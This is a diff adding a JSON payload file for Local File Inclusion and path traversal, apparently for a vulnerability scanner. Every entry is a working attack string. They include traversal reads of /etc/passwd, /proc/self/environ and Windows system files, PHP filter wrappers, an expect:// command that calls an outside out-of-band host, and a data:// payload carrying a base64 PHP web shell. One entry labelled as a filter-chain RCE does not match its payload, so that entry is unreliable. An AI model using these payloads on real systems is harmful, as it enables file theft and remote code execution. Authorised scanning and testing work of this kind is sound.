@@ -1,0 +1,21 @@
+{
+  "vulnerability": "Local File Inclusion / Path Traversal",
+  "category": "lfi",
+  "dialects": {
+    "linux": [
+      {"name": "etc/passwd Basic", "type": "file_read", "payload": "../../../../../../../../etc/passwd", "oast": false},
+      {"name": "etc/passwd Null Byte", "type": "file_read", "payload": "../../../../../../../../etc/passwd%00", "oast": false},
+      {"name": "etc/hosts", "type": "file_read", "payload": "../../../../../../../../etc/hosts", "oast": false},
+      {"name": "proc/self/environ", "type": "file_read", "payload": "../../../../../../../../proc/self/environ", "oast": false},
+      {"name": "PHP Filter Base64", "type": "php_wrapper", "payload": "php://filter/convert.base64-encode/resource=index", "oast": false},
+      {"name": "PHP Filter Chain RCE", "type": "php_wrapper", "payload": "php://filter/convert.iconv.utf8.utf16/resource=index", "oast": false},
+      {"name": "PHP expect:// OAST", "type": "oast", "payload": "expect://nslookup {oast_id}.oast.fun", "oast": true},
+      {"name": "data:// PHP RCE", "type": "php_wrapper", "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "oast": false}
+    ],
+    "windows": [
+      {"name": "win.ini Basic", "type": "file_read", "payload": "../../../../../../../../windows/win.ini", "oast": false},
+      {"name": "boot.ini", "type": "file_read", "payload": "../../../../../../../../boot.ini", "oast": false},
+      {"name": "Windows hosts", "type": "file_read", "payload": "../../../../../../../../Windows/System32/drivers/etc/hosts", "oast": false}
+    ]
+  }
+}
